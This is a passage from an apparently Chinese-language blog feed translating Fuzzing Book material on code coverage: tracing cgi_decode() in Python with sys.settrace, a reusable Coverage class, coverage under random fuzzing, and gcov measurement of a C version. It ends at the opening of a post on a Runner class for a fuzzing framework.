进行测试并记录结果。</p><ul><li>测试是否正确更换’+’</li><li>测试是否正确更换“%xx”</li><li>测试是否正确的替换其他字符</li><li>测试能否识别非法输入</li></ul><p>以下是涵盖这四个功能的四个测试（assert断言），我们可以看到它全部通过了测试。</p><pre><code class="python">assert cgi_decode(&#39;+&#39;) == &#39; &#39;assert cgi_decode(&#39;%20&#39;) == &#39; &#39;assert cgi_decode(&#39;abc&#39;) == &#39;abc&#39;try:    cgi_decode(&#39;%?a&#39;)    assert Falseexcept ValueError:    pass</code></pre><p>黑盒测试的优点是可以直接发现 <em>指定</em> 行为中的错误。它独立于被测试程序本身，因此即使在程序完全实现之前也可以创建测试，看进展如何。不利的一面是，待测试程序包含的行为通常比<em>指定的</em> 行为覆盖更多的分支，因此仅基于规范的测试通常不会覆盖所有实现细节。</p><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>与黑盒测试相反，白盒测试知道程序的内部细节，其测试样例是根据程序本身生成的。白盒测试与代码结构特征的概念紧密相关，例如，如果在测试过程中未执行代码中的某一个语句，则意味着该语句中的错误也无法触发。因此，白盒测试引入了许多<em>覆盖的标准</em>，在可以判定该测试覆盖完全之前，必须满足这些基本标准。最常用的覆盖标准是：</p><ul><li>语句覆盖范围——代码中的每个语句必须至少由一个测试输入执行</li><li>分支覆盖范围——代码中的每个分支都必须至少有一个测试输入（这意味着每个<code>if</code>和<code>while</code>语句都要一次结果为真，一次结果为假，才能覆盖全面）</li></ul><p>除此之外还有更多的覆盖标准，包括采用的分支顺序，采用的循环迭代（零次，一次，多次），变量定义和用法之间的数据流等等，[ <a href="http://ix.cs.uoregon.edu/~michal/book/">Pezzèet <em>al</em>，2008.</a> ]里有一个很好的概述。</p><p>在<code>cgi_decode()</code>上，让我们思考一下必须做的事情，以使每个代码语句至少执行一次。我们必须覆盖以下几点：</p><ul><li>包括 <code>if c == &#39;+&#39;</code>  的判断块</li><li>包括<code>if c == &#39;%&#39;</code>的两个判断块（一个用于有效输入，一个用于无效输入）</li><li>最后一个<code>else</code>块包括其他没有考虑到的一些输入情况</li></ul><p>白盒测试的优点是可以发现被测程序已知内部细节中的错误。实际上，它有助于识别（从而指定）内部规范中的极端情况。缺点是它可能会错过某些<em>未实现的</em>行为：如果缺少某些指定的功能，白盒测试将无法覆盖它。</p><h3 id="追踪执行"><a href="#追踪执行" class="headerlink" title="追踪执行"></a>追踪执行</h3><p>白盒测试的一个不错的功能是，它实际上可以自动评估是否涵盖了某些程序功能。为此，一个追踪程序的执行，使得执行期间，一个特殊的函数跟踪哪些被执行的代码。测试之后，将这些信息传递给程序员，然后程序员可以专注于编写那些未覆盖代码的进一步测试。</p><p>在大多数编程语言中，要设置一个程序以使其能够跟踪其执行是相当困难的。但在Python中并非如此，函数<code>sys.settrace(f)</code>允许定义一个<em>跟踪函数</em> <code>f()</code>，该<em>跟踪函数</em>针对每条执行的行代码进行调用。更棒的是，它可以访问当前函数及其名称和当前变量内容等。因此，它是进行<em>动态分析</em>的理想工具—它有助于对执行过程中实际发生的情况进行分析。</p><p>为了说明它是如何工作的，让我们再次研究特定执行的<code>cgi_decode()</code>。</p><pre><code class="python">cgi_decode(&quot;a+b&quot;)</code></pre><pre><code class="python">&#39;a b&#39;</code></pre><p>为了跟踪<code>cgi_decode()</code>执行的过程，我们使用<code>sys.settrace()</code>。首先，我们定义跟踪函数来追踪每一行代码。它具有三个参数：</p><ul><li><code>frame</code>参数提供当前行信息，从而允许访问当前位置和变量：<ul><li><code>frame.f_code</code>是当前行执行的代码，<code>frame.f_code.co_name</code>即函数名；</li><li><code>frame.f_lineno</code>保持当前行号；</li><li><code>frame.f_locals</code> 保留当前的局部变量和参数。</li></ul></li><li><code>event</code>参数是一个字符串，其值包括<code>&quot;line&quot;</code>（已到达行）或<code>&quot;call&quot;</code>（正在调用函数）。</li><li><code>arg</code>参数是某些事件的附加<em>参数</em>。例如，对于<code>&quot;return&quot;</code>事件，<code>arg</code>将保留要返回的值。</li></ul><p>我们使用跟踪函数来简单地获得当前行信息，之后通过<code>frame</code>参数访问该行信息。</p><pre><code>coverage = []</code></pre><pre><code class="python">def traceit(frame, event, arg):    if event == &quot;line&quot;:        global coverage        function_name = frame.f_code.co_name        lineno = frame.f_lineno        coverage.append(lineno)    return traceit</code></pre><p>我们可以使用<code>sys.settrace()</code>命令打开和关闭跟踪：</p><pre><code class="python">import sys</code></pre><pre><code class="python">def cgi_decode_traced(s):    global coverage    coverage = []    sys.settrace(traceit)  # Turn on    cgi_decode(s)    sys.settrace(None)    # Turn off</code></pre><p>当我们计算<code>cgi_decode(&quot;a+b&quot;)</code>时，可以看到执行过程。</p><pre><code class="python">cgi_decode_traced(&quot;a+b&quot;)print(coverage)</code></pre><pre><code class="python">[9, 10, 11, 12, 15, 16, 17, 18, 19, 21, 30, 31, 17, 18, 19, 20, 31, 17, 18, 19, 21, 30, 31, 17, 32]</code></pre><p>可是这些数字对应的究竟是哪几行？总不能每次追踪都拿着源码一行行对着看吧。为此，让我们直接获取目标源码<code>cgi_decode_code</code>，并将其编码为一个数组<code>cgi_decode_lines</code>，然后使用覆盖率信息对其进行注释。首先，让我们获取以下代码<code>cgi_encode</code>：</p><pre><code class="python">import inspect</code></pre><pre><code class="python">cgi_decode_code = inspect.getsource(cgi_decode)</code></pre><p><code>cgi_decode_code</code>是包含源代码的字符串。我们可以使用Python语法高亮显示它：</p><pre><code class="python">from bookutils import print_content, print_file</code></pre><pre><code class="python">print_content(cgi_decode_code[:300] + &quot;...&quot;, &quot;.py&quot;)</code></pre><pre><code class="python">def cgi_decode(s):    &quot;&quot;&quot;Decode the CGI-encoded string `s`:       * replace &quot;+&quot; by &quot; &quot;       * replace &quot;%xx&quot; by the character with hex number xx.       Return the decoded string.  Raise `ValueError` for invalid inputs.&quot;&quot;&quot;    # Mapping of hex digits to their integer values    hex_values = &#123;  ...</code></pre><p>使用<code>splitlines()</code>，我们将代码分成几行，并按行号索引。</p><pre><code class="python">cgi_decode_lines = [&quot;&quot;] + cgi_decode_code.splitlines()</code></pre><p><code>cgi_decode_lines[L]</code> 是源代码的L行。</p><pre><code class="python">cgi_decode_lines [ 1 ]</code></pre><pre><code class="python">&#39;def cgi_decode（s）：&#39;</code></pre><p>我们看到执行的第一行line（9）实际上是<code>hex_values</code>…的初始化</p><pre><code>cgi_decode_lines[9:13]</code></pre><pre><code class="python">[&quot;        &#39;0&#39;: 0, &#39;1&#39;: 1, &#39;2&#39;: 2, &#39;3&#39;: 3, &#39;4&#39;: 4,&quot;, &quot;        &#39;5&#39;: 5, &#39;6&#39;: 6, &#39;7&#39;: 7, &#39;8&#39;: 8, &#39;9&#39;: 9,&quot;, &quot;        &#39;a&#39;: 10, &#39;b&#39;: 11, &#39;c&#39;: 12, &#39;d&#39;: 13, &#39;e&#39;: 14, &#39;f&#39;: 15,&quot;, &quot;        &#39;A&#39;: 10, &#39;B&#39;: 11, &#39;C&#39;: 12, &#39;D&#39;: 13, &#39;E&#39;: 14, &#39;F&#39;: 15,&quot;]</code></pre><p>…然后初始化<code>t</code>：</p><pre><code>cgi_decode_lines [ 15 ]</code></pre><pre><code>&#39;    t = &quot;&quot;&#39;</code></pre><p>要查看实际上至少覆盖了<code>coverage</code>几行，我们可以将其转换为一组：</p><pre><code class="python">covered_lines = set(coverage)print(covered_lines)</code></pre><pre><code>&#123;32, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 30, 31&#125;</code></pre><p>让我们打印出完整的代码，用’＃’注释未覆盖的行：</p><pre><code class="python">for lineno in range(1, len(cgi_decode_lines)):    if lineno not in covered_lines:        print(&quot;# &quot;, end=&quot;&quot;)    else:        print(&quot;  &quot;, end=&quot;&quot;)    print(&quot;%2d  &quot; % lineno, end=&quot;&quot;)    print_content(cgi_decode_lines[lineno], &#39;.py&#39;)</code></pre><pre><code>#  1  def cgi_decode(s):#  2      &quot;&quot;&quot;Decode the CGI-encoded string `s`:#  3         * replace &quot;+&quot; by &quot; &quot;#  4         * replace &quot;%xx&quot; by the character with hex number xx.#  5         Return the decoded string.  Raise `ValueError` for invalid inputs.&quot;&quot;&quot;#  6  #  7      # Mapping of hex digits to their integer values#  8      hex_values = &#123;   9          &#39;0&#39;: 0, &#39;1&#39;: 1, &#39;2&#39;: 2, &#39;3&#39;: 3, &#39;4&#39;: 4,  10          &#39;5&#39;: 5, &#39;6&#39;: 6, &#39;7&#39;: 7, &#39;8&#39;: 8, &#39;9&#39;: 9,  11          &#39;a&#39;: 10, &#39;b&#39;: 11, &#39;c&#39;: 12, &#39;d&#39;: 13, &#39;e&#39;: 14, &#39;f&#39;: 15,  12          &#39;A&#39;: 10, &#39;B&#39;: 11, &#39;C&#39;: 12, &#39;D&#39;: 13, &#39;E&#39;: 14, &#39;F&#39;: 15,# 13      &#125;# 14    15      t = &quot;&quot;  16      i = 0  17      while i &lt; len(s):  18          c = s[i]  19          if c == &#39;+&#39;:  20              t += &#39; &#39;  21          elif c == &#39;%&#39;:# 22              digit_high, digit_low = s[i + 1], s[i + 2]# 23              i += 2# 24              if digit_high in hex_values and digit_low in hex_values:# 25                  v = hex_values[digit_high] * 16 + hex_values[digit_low]# 26                  t += chr(v)# 27              else:# 28                  raise ValueError(&quot;Invalid encoding&quot;)# 29          else:  30              t += c  31          i += 1  32      return t</code></pre><p>我们看到许多行（尤其是注释）尚未执行，仅仅是因为它们不是可执行的。然而，我们也看到，在该行<code>if c == &#39;%&#39;</code>没有执行到。如果这<code>&quot;a+b&quot;</code>是到目前为止我们唯一的测试用例，那么现在缺少的覆盖范围将指导我们创建另一个实际覆盖这些行的测试用例。</p><h3 id="覆盖率类"><a href="#覆盖率类" class="headerlink" title="覆盖率类"></a>覆盖率类</h3><p>之后我们会多次引用测量代码覆盖率的功能，使用全局<code>coverage</code>变量的实现总是有点麻烦。因此，我们创建一个类，可以帮助我们轻松地测量覆盖率。</p><p>这里获得覆盖率的关键思想是利用Python的<code>with</code>语句。一般形式为</p><pre><code class="python">with OBJECT [as VARIABLE]:    BODY</code></pre><p><code>BODY</code>以<code>OBJECT</code>定义的方式执行（并存储在<code>VARIABLE</code>中）。有趣的是，在<code>BODY</code>的开始和结尾处，特殊方法<code>OBJECT.__enter__()</code>和<code>OBJECT.__exit__()</code>被自动调用，即使<code>BODY</code>引发异常。这使我们能够定义一个<code>Coverage</code>对象，在该对象中<code>Coverage.__enter__()</code>可以自动打开跟踪并且<code>Coverage.__exit__()</code>可以自动关闭跟踪。之后，我们就可以用这种方法来访问coverage。这是在使用过程中的样子：</p><pre><code class="python">with Coverage() as cov:    function_to_be_traced()c = cov.coverage()</code></pre><p>在此，跟踪<code>function_to_be_traced()</code>在<code>with</code>块期间自动打开，并在块之后再次关闭。之后，我们可以访问执行的覆盖路径。</p><p>以下是实现的全部细节，无需追求每一个细节都懂，只要知道该如何使用他们就够了。</p><pre><code class="python">class Coverage(object):    # Trace function    def traceit(self, frame, event, arg):        if self.original_trace_function is not None:            self.original_trace_function(frame, event, arg)        if event == &quot;line&quot;:            function_name = frame.f_code.co_name            lineno = frame.f_lineno            self._trace.append((function_name, lineno))        return self.traceit    def __init__(self):        self._trace = []    # Start of `with` block    def __enter__(self):        self.original_trace_function = sys.gettrace()        sys.settrace(self.traceit)        return self    # End of `with` block    def __exit__(self, exc_type, exc_value, tb):        sys.settrace(self.original_trace_function)    def trace(self):        &quot;&quot;&quot;The list of executed lines, as (function_name, line_number) pairs&quot;&quot;&quot;        return self._trace    def coverage(self):        &quot;&quot;&quot;The set of executed lines, as (function_name, line_number) pairs&quot;&quot;&quot;        return set(self.trace())</code></pre><p>来试着用一次看看：</p><pre><code class="python">with Coverage() as cov:    cgi_decode(&quot;a+b&quot;)print(cov.coverage())</code></pre><pre><code class="python">&#123;(&#39;cgi_decode&#39;, 17), (&#39;cgi_decode&#39;, 18), (&#39;cgi_decode&#39;, 19), (&#39;cgi_decode&#39;, 30), (&#39;cgi_decode&#39;, 9), (&#39;cgi_decode&#39;, 20), (&#39;cgi_decode&#39;, 31), (&#39;cgi_decode&#39;, 10), (&#39;cgi_decode&#39;, 21), (&#39;cgi_decode&#39;, 32), (&#39;cgi_decode&#39;, 11), (&#39;__exit__&#39;, 25), (&#39;cgi_decode&#39;, 12), (&#39;cgi_decode&#39;, 15), (&#39;cgi_decode&#39;, 16)&#125;</code></pre><p>如您所见，<code>Coverage()</code>该类不仅跟踪执行的行，而且跟踪函数名。如果被测试对象是一个调用多个不同文件的程序，这将很有用。</p><h3 id="比较覆盖率"><a href="#比较覆盖率" class="headerlink" title="比较覆盖率"></a>比较覆盖率</h3><p>我们用coverage表示由已执行数组成的组，因此也可以在此之上执行一些操作。例如，我们可以找出某个测试用例涵盖哪些行，而某些测试用例则无法覆盖：</p><pre><code class="python">with Coverage() as cov_plus:    cgi_decode(&quot;a+b&quot;)with Coverage() as cov_standard:    cgi_decode(&quot;abc&quot;)cov_plus.coverage() - cov_standard.coverage()</code></pre><pre><code>&#123;(&#39;cgi_decode&#39;, 20)&#125;</code></pre><p>这是仅<code>&#39;a+b&#39;</code>执行的代码中的行号。</p><p>我们还可以比较集合以找出哪些行仍需要覆盖。让我们将其定义<code>cov_max</code>为我们可以实现的最大覆盖范围。（在这里，我们通过执行已经存在的“好”测试用例来执行此操作。在实践中，我们将静态分析代码结构，这将在符号执行章节中介绍）</p><pre><code class="python">import bookutils</code></pre><pre><code class="python">with Coverage() as cov_max:    cgi_decode(&#39;+&#39;)    cgi_decode(&#39;%20&#39;)    cgi_decode(&#39;abc&#39;)    try:        cgi_decode(&#39;%?a&#39;)    except:        pass</code></pre><p>这样我们就能很方便的看出该测试用例没有覆盖到哪一行。</p><pre><code class="python">cov_max.coverage() - cov_plus.coverage()</code></pre><pre><code>&#123;(&#39;cgi_decode&#39;, 22), (&#39;cgi_decode&#39;, 23), (&#39;cgi_decode&#39;, 24), (&#39;cgi_decode&#39;, 25), (&#39;cgi_decode&#39;, 26), (&#39;cgi_decode&#39;, 28)&#125;</code></pre><p>我们可以看出这些行号是处理 <code>&quot;%xx&quot;</code>的，测试用例中没有覆盖到这种情况。</p><h3 id="基础模糊测试的覆盖范围"><a href="#基础模糊测试的覆盖范围" class="headerlink" title="基础模糊测试的覆盖范围"></a>基础模糊测试的覆盖范围</h3><p>现在，我们可以使用覆盖范围跟踪来评估测试方法的<em>有效性</em>，尤其是测试我们上一节讲的<em>生成</em>方法。我们的挑战是针对<code>cgi_decode()</code>仅使用随机输入就可实现最大覆盖。原则上是可以的，但是这到底要花费多长时间？为此，让我们对<code>cgi_decode()</code>进行一次实际测试：</p><pre><code class="python">from Fuzzer import fuzzer</code></pre><pre><code class="python">sample = fuzzer()sample</code></pre><pre><code class="python">&#39;!7#%&quot;*#0=)$;%6*;&gt;638:*&gt;80&quot;=&lt;/&gt;(/*:-(2&lt;4 !:5*6856&amp;?&quot;&quot;11&lt;7+%&lt;%7,4.8,*+&amp;,,$,.&quot;&#39;</code></pre><p>我们把<code>cgi_decode()</code>包装在一个<code>try...except</code>块中，以便我们可以忽略<code>%xx</code>格式引发的异常。</p><pre><code class="python">with Coverage() as cov_fuzz:    try:        cgi_decode(sample)    except:        passcov_fuzz.coverage()</code></pre><pre><code class="python">&#123;(&#39;__exit__&#39;, 25), (&#39;cgi_decode&#39;, 9), (&#39;cgi_decode&#39;, 10), (&#39;cgi_decode&#39;, 11), (&#39;cgi_decode&#39;, 12), (&#39;cgi_decode&#39;, 15), (&#39;cgi_decode&#39;, 16), (&#39;cgi_decode&#39;, 17), (&#39;cgi_decode&#39;, 18), (&#39;cgi_decode&#39;, 19), (&#39;cgi_decode&#39;, 21), (&#39;cgi_decode&#39;, 22), (&#39;cgi_decode&#39;, 23), (&#39;cgi_decode&#39;, 24), (&#39;cgi_decode&#39;, 28), (&#39;cgi_decode&#39;, 30), (&#39;cgi_decode&#39;, 31)&#125;</code></pre><p>这是否已经是最大的覆盖范围？显然，它仍然缺失以下几行。</p><pre><code class="python">cov_max.coverage() - cov_fuzz.coverage()</code></pre><pre><code class="python">&#123;(&#39;cgi_decode&#39;, 20), (&#39;cgi_decode&#39;, 25), (&#39;cgi_decode&#39;, 26), (&#39;cgi_decode&#39;, 32)&#125;</code></pre><p>再来一次，把随机输入的范围扩大到100个。与此同时，我们使用一个数组<code>cumulative_coverage</code>来存储随着时间的推移所达到的覆盖率；<code>cumulative_coverage[0]</code>是第一个随机输入执行之后覆盖的总行数，<code>cumulative_coverage[1]</code>是1-2个随机输入之后覆盖的总行数 ，依此类推。</p><pre><code>trials = 100</code></pre><pre><code class="python">def population_coverage(population, function):    cumulative_coverage = []    all_coverage = set()    for s in population:        with Coverage() as cov:            try:                function(s)            except:                pass        all_coverage |= cov.coverage()        cumulative_coverage.append(len(all_coverage))    return all_coverage, cumulative_coverage</code></pre><p>让我们创建一百个输入来确定覆盖范围如何增加：</p><pre><code class="python">def hundred_inputs():    population = []    for i in range(trials):        population.append(fuzzer())    return population</code></pre><p>以下是每次输入时覆盖范围如何增加的信息：</p><pre><code class="python">all_coverage, cumulative_coverage = population_coverage(    hundred_inputs(), cgi_decode)</code></pre><pre><code class="python">%matplotlib inline</code></pre><pre><code class="python">import matplotlib.pyplot as plt</code></pre><pre><code class="python">plt.plot(cumulative_coverage)plt.title(&#39;Coverage of cgi_decode() with random inputs&#39;)plt.xlabel(&#39;# of inputs&#39;)plt.ylabel(&#39;lines covered&#39;)</code></pre><pre><code>Text(0, 0.5, &#39;lines covered&#39;)</code></pre><p><img src="https://i.loli.net/2021/03/10/h6iOvnbm4yHc9eG.png" alt="image-20210310110452495"></p><p>当然，这只是一次运行的结果。让我们多重复几次，并绘制它的平均值图。</p><pre><code class="python">runs = 100# Create an array with TRIALS elements, all zerosum_coverage = [0] * trialsfor run in range(runs):    all_coverage, coverage = population_coverage(hundred_inputs(), cgi_decode)    assert len(coverage) == trials    for i in range(trials):        sum_coverage[i] += coverage[i]average_coverage = []for i in range(trials):    average_coverage.append(sum_coverage[i] / runs)</code></pre><pre><code class="python">plt.plot(average_coverage)plt.title(&#39;Average coverage of cgi_decode() with random inputs&#39;)plt.xlabel(&#39;# of inputs&#39;)plt.ylabel(&#39;lines covered&#39;)</code></pre><pre><code>Text(0, 0.5, &#39;lines covered&#39;)</code></pre><p><img src="https://i.loli.net/2021/03/10/7XwxtNqiEUdPTsJ.png" alt="image-20210310110658992"></p><p>我们可以看到，平均后大概输入在40—60次左右我们就能够得到完整的覆盖率范围。</p><h3 id="从其他程序获取覆盖率"><a href="#从其他程序获取覆盖率" class="headerlink" title="从其他程序获取覆盖率"></a>从其他程序获取覆盖率</h3><p>可惜世界上不只有python一种程序。对于其他程序，获取覆盖率的问题也无处不在，几乎每种语言都有测量覆盖率的功能，我们来看一下如何获取C语言程序的覆盖率。</p><p>我们使用C语言再次实现<code>cgi_decode</code>的功能，只是这次作为要从命令行执行的程序：</p><pre><code>$ ./cgi_decode &#39;Hello+World&#39;Hello World</code></pre><p>以下是C语言代码，和python类似，先从include开始。</p><pre><code class="c">cgi_c_code = &quot;&quot;&quot;/* CGI decoding as C program */#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;&quot;&quot;&quot;</code></pre><p>下面是初始化 <code>hex_values</code>:</p><pre><code class="c">cgi_c_code += r&quot;&quot;&quot;int hex_values[256];void init_hex_values() &#123;    for (int i = 0; i &lt; sizeof(hex_values) / sizeof(int); i++) &#123;        hex_values[i] = -1;    &#125;    hex_values[&#39;0&#39;] = 0; hex_values[&#39;1&#39;] = 1; hex_values[&#39;2&#39;] = 2; hex_values[&#39;3&#39;] = 3;    hex_values[&#39;4&#39;] = 4; hex_values[&#39;5&#39;] = 5; hex_values[&#39;6&#39;] = 6; hex_values[&#39;7&#39;] = 7;    hex_values[&#39;8&#39;] = 8; hex_values[&#39;9&#39;] = 9;    hex_values[&#39;a&#39;] = 10; hex_values[&#39;b&#39;] = 11; hex_values[&#39;c&#39;] = 12; hex_values[&#39;d&#39;] = 13;    hex_values[&#39;e&#39;] = 14; hex_values[&#39;f&#39;] = 15;    hex_values[&#39;A&#39;] = 10; hex_values[&#39;B&#39;] = 11; hex_values[&#39;C&#39;] = 12; hex_values[&#39;D&#39;] = 13;    hex_values[&#39;E&#39;] = 14; hex_values[&#39;F&#39;] = 15;&#125;&quot;&quot;&quot;</code></pre><p>下面是实际实现<code>cgi_decode()</code>，使用用于输入源（<code>s</code>）和输出目标（<code>t</code>）的指针：</p><pre><code class="c">cgi_c_code += r&quot;&quot;&quot;int cgi_decode(char *s, char *t) &#123;    while (*s != &#39;\0&#39;) &#123;        if (*s == &#39;+&#39;)            *t++ = &#39; &#39;;        else if (*s == &#39;%&#39;) &#123;            int digit_high = *++s;            int digit_low = *++s;            if (hex_values[digit_high] &gt;= 0 &amp;&amp; hex_values[digit_low] &gt;= 0) &#123;                *t++ = hex_values[digit_high] * 16 + hex_values[digit_low];            &#125;            else                return -1;        &#125;        else            *t++ = *s;        s++;    &#125;    *t = &#39;\0&#39;;    return 0;&#125;&quot;&quot;&quot;</code></pre><p>最后，这是一个使用第一个参数并调用<code>cgi_decode</code>的驱动程序：</p><pre><code class="c">cgi_c_code += r&quot;&quot;&quot;int main(int argc, char *argv[]) &#123;    init_hex_values();    if (argc &gt;= 2) &#123;        char *s = argv[1];        char *t = malloc(strlen(s) + 1); /* output is at most as long as input */        int ret = cgi_decode(s, t);        printf(&quot;%s\n&quot;, t);        return ret;    &#125;    else    &#123;        printf(&quot;cgi_decode: usage: cgi_decode STRING\n&quot;);        return 1;    &#125;&#125;&quot;&quot;&quot;</code></pre><p>让我们创建C源代码：</p><pre><code class="c">with open(&quot;cgi_decode.c&quot;, &quot;w&quot;) as f:    f.write(cgi_c_code)</code></pre><p>在这里，我们的C代码突出显示了其语法：</p><pre><code>from bookutils import print_file</code></pre><pre><code>print_file(&quot;cgi_decode.c&quot;)</code></pre><pre><code class="c">/* CGI decoding as C program */#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;int hex_values[256];void init_hex_values() &#123;    for (int i = 0; i &lt; sizeof(hex_values) / sizeof(int); i++) &#123;        hex_values[i] = -1;    &#125;    hex_values[&#39;0&#39;] = 0; hex_values[&#39;1&#39;] = 1; hex_values[&#39;2&#39;] = 2; hex_values[&#39;3&#39;] = 3;    hex_values[&#39;4&#39;] = 4; hex_values[&#39;5&#39;] = 5; hex_values[&#39;6&#39;] = 6; hex_values[&#39;7&#39;] = 7;    hex_values[&#39;8&#39;] = 8; hex_values[&#39;9&#39;] = 9;    hex_values[&#39;a&#39;] = 10; hex_values[&#39;b&#39;] = 11; hex_values[&#39;c&#39;] = 12; hex_values[&#39;d&#39;] = 13;    hex_values[&#39;e&#39;] = 14; hex_values[&#39;f&#39;] = 15;    hex_values[&#39;A&#39;] = 10; hex_values[&#39;B&#39;] = 11; hex_values[&#39;C&#39;] = 12; hex_values[&#39;D&#39;] = 13;    hex_values[&#39;E&#39;] = 14; hex_values[&#39;F&#39;] = 15;&#125;int cgi_decode(char *s, char *t) &#123;    while (*s != &#39;\0&#39;) &#123;        if (*s == &#39;+&#39;)            *t++ = &#39; &#39;;        else if (*s == &#39;%&#39;) &#123;            int digit_high = *++s;            int digit_low = *++s;            if (hex_values[digit_high] &gt;= 0 &amp;&amp; hex_values[digit_low] &gt;= 0) &#123;                *t++ = hex_values[digit_high] * 16 + hex_values[digit_low];            &#125;            else                return -1;        &#125;        else            *t++ = *s;        s++;    &#125;    *t = &#39;\0&#39;;    return 0;&#125;int main(int argc, char *argv[]) &#123;    init_hex_values();    if (argc &gt;= 2) &#123;        char *s = argv[1];        char *t = malloc(strlen(s) + 1); /* output is at most as long as input */        int ret = cgi_decode(s, t);        printf(&quot;%s\n&quot;, t);        return ret;    &#125;    else    &#123;        printf(&quot;cgi_decode: usage: cgi_decode STRING\n&quot;);        return 1;    &#125;&#125;</code></pre><p>现在，我们可以将C代码编译为可执行文件。该<code>--coverage</code>选项指示C编译器对代码进行检测，以便在运行时收集覆盖率信息。</p><pre><code>!cc --coverage -o cgi_decode cgi_decode.c</code></pre><p>现在，当我们执行程序时，覆盖率信息将自动收集并存储在辅助文件中：</p><pre><code>!./cgi_decode &#39;Send+mail+to+me%40fuzzingbook.org&#39;</code></pre><pre><code>Send mail to me@fuzzingbook.org</code></pre><p>覆盖范围信息由<code>gcov</code>程序收集。对于给定的每个源文件，它将生成一个<code>.gcov</code>具有覆盖率信息的新文件。</p><pre><code>!gcov cgi_decode.c</code></pre><pre><code>File &#39;cgi_decode.c&#39;Lines executed:92.50% of 40cgi_decode.c:creating &#39;cgi_decode.c.gcov&#39;</code></pre><p>在<code>.gcov</code>文件中，每行都以被调用的次数为前缀（<code>-</code>代表不可执行的行，<code>#####</code>代表零）以及行号。例如<code>cgi_decode()</code>，我们可以看一下，发现唯一尚未执行的代码就是<code>return -1</code>用于非法输入的代码。</p><pre><code class="c">lines = open(&#39;cgi_decode.c.gcov&#39;).readlines()for i in range(30, 50):    print(lines[i], end=&#39;&#39;)</code></pre><pre><code class="c">        1:   26:int cgi_decode(char *s, char *t) &#123;       32:   27:    while (*s != &#39;\0&#39;) &#123;       31:   28:        if (*s == &#39;+&#39;)        3:   29:            *t++ = &#39; &#39;;       28:   30:        else if (*s == &#39;%&#39;) &#123;        1:   31:            int digit_high = *++s;        1:   32:            int digit_low = *++s;        1:   33:            if (hex_values[digit_high] &gt;= 0 &amp;&amp; hex_values[digit_low] &gt;= 0) &#123;        1:   34:                *t++ = hex_values[digit_high] * 16 + hex_values[digit_low];        1:   35:            &#125;        -:   36:            else    #####:   37:                return -1;        1:   38:        &#125;        -:   39:        else       27:   40:            *t++ = *s;       31:   41:        s++;        -:   42:    &#125;        1:   43:    *t = &#39;\0&#39;;        1:   44:    return 0;        1:   45:&#125;</code></pre><p>让我们读入此文件以获得覆盖范围集：</p><pre><code class="python">def read_gcov_coverage(c_file):    gcov_file = c_file + &quot;.gcov&quot;    coverage = set()    with open(gcov_file) as file:        for line in file.readlines():            elems = line.split(&#39;:&#39;)            covered = elems[0].strip()            line_number = int(elems[1].strip())            if covered.startswith(&#39;-&#39;) or covered.startswith(&#39;#&#39;):                continue            coverage.add((c_file, line_number))    return coverage</code></pre><pre><code class="python">coverage = read_gcov_coverage(&#39;cgi_decode.c&#39;)</code></pre><pre><code class="python">list(coverage)[:5]</code></pre><pre><code class="python">[(&#39;cgi_decode.c&#39;, 17), (&#39;cgi_decode.c&#39;, 38), (&#39;cgi_decode.c&#39;, 48), (&#39;cgi_decode.c&#39;, 41), (&#39;cgi_decode.c&#39;, 29)]</code></pre><p>有了这个设置，我们现在可以执行与Python程序相同的coverage计算。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>覆盖率指标是一种简单且完全自动化的方法，用于估算在测试运行期间实际执行了多少程序功能。</li><li>存在许多覆盖率指标，最重要的是语句覆盖率和分支覆盖率。</li><li>在Python中，执行期间访问程序状态非常容易，包括当前执行的代码。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 新趋势 </tag>
            
            <tag> Fuzzbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzbook3——一种Fuzz的框架结构</title>
      <link href="2021/01/20/fuzzbook3%20fuzz%E6%A1%86%E6%9E%B6/"/>
      <url>2021/01/20/fuzzbook3%20fuzz%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20210111/1610358571_5ffc1f2b95e569df29bae.png!small" alt="image-20201005165901975"></p><p>由于之后的章节中我们会常常用到第二部分所提到的Fuzzer与Runner思路结构，因此创建一种易于重复使用、后期易于拓展的Fuzz框架结构就显得十分重要。为此我们引入Python中类的概念，来逐步封装之前所提到的功能，为后面的章节做准备。</p><a id="more"></a><h3 id="创建Runner的类："><a href="#创建Runner的类：" class="headerlink" title="创建Runner的类："></a>创建Runner的类：</h3><p>我么首先需要介绍的是Runner的概念：使用给定的输入来执行某些特定的程序，特定的程序通常是指要接受测试的某些程序或函数。</p><p>Runner本质上提供了一种run（input）方法：用于将input（字符串）传递给程序运行。run（）会返回一对值（result，outcome），这里的result是run运行后结果的返回值，提供了run运行的细节供我们参考；outcome是将结果分为三类值：</p><ul><li><code>Runner.PASS</code>—测试<em>通过</em>。运行产生正确的结果。</li><li><code>Runner.FAIL</code>—测试<em>失败</em>。运行产生不正确的结果。</li><li><code>Runner.UNRESOLVED</code>—测试既没有通过也没有失败。如果无法进行运行（例如输入无效），则会发生这种情况。</li></ul><pre><code class="python">class Runner(object):    # Test outcomes    PASS = &quot;PASS&quot;    FAIL = &quot;FAIL&quot;    UNRESOLVED = &quot;UNRESOLVED&quot;    def __init__(self):        &quot;&quot;&quot;Initialize&quot;&quot;&quot;        pass    def run(self, inp):        &quot;&quot;&quot;Run the runner with the given input&quot;&quot;&quot;        return (inp, Runner.UNRESOLVED)</code></pre><p>这里的Runner类是后续的一个基类，仅仅是一个基础的框架。后续要根据自己的需求继承该基类并用额外的函数重写。</p><p>这里举一个简单的例子：PrintRunner会打印出所有传递给自身的值，它就是基于Runner继承并修改的：</p><pre><code class="python">class PrintRunner(Runner):    def run(self, inp):        &quot;&quot;&quot;Print the given input&quot;&quot;&quot;        print(inp)        return (inp, Runner.UNRESOLVED)</code></pre><pre><code class="python">p = PrintRunner()(result, outcome) = p.run(&quot;Some input&quot;)</code></pre><p>结果就是我们作为输入传递的字符串：</p><pre><code class="python">result：&#39;Some 